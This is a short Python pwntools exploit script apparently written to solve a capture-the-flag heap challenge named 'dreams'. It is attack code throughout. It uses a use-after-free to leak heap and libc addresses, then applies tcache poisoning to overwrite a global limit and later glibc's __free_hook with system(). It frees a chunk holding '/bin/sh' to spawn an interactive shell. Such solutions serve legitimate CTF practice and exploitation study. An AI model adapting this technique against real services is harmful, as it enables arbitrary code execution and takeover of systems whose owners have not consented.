#!/usr/bin/env python3


from pwn import *


e = ELF("./dreams")
libc = ELF("./libc.so.6")
r = process("./dreams_patched")
#r = remote("challs.actf.co",31227)
def sleep(index,date,dream):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"dream?",f"{index}")
    r.sendafter(b"(mm/dd/yy))?",date)
    r.sendafter(b"about?",dream)

def sell(index):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"in?",f"{index}")

def visit(index,date):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"giving you trouble?",f"{index}")
    r.sendafter(b"date",date)

def visit_heap(index,date):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"giving you trouble?",f"{index}")
    r.recvuntil(b"is telling you that ")
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    r.sendafter(b"date",date)
    return leak

def visit_libc(index,date):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"giving you trouble?",f"{index}")
    r.recvuntil(b"AAAAAAAA\xff\xff\xff\x7f\xff\xff\xff\xff")
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    r.sendafter(b"date",date)
    return leak - 0x1ed6a0

sleep(0,b"ajay",b"strikerr")
sell(0)
heap_base = visit_heap(0,b"ajay")
sleep(1,b"B",b"B2")
sleep(2,b"C",b"C2")
sell(1)
sell(2)
visit(2,p64(e.sym.MAX_DREAMS - 0x10))
sleep(3,b"D",b"D2")
sleep(4,p64(0x0),b"A" * 8 + p64(0xffffffff7fffffff) + p8(0xa0))
libc_base = visit_libc(4,p64(0x0))
log.info("The libc base of the process " + hex(libc_base))
sleep(7,b"E",b"E2")
sleep(8,b"F",b"F2")
sell(7)
sell(8)
visit(8,p64(libc_base + libc.sym.__free_hook))
sleep(9,b"/bin/sh\x00",p8(0))
log.info("The system function address is " + hex(libc_base + libc.sym.system))
sleep(10,p64(libc_base + libc.sym.system),b"\x00")
sell(9)
r.interactive()
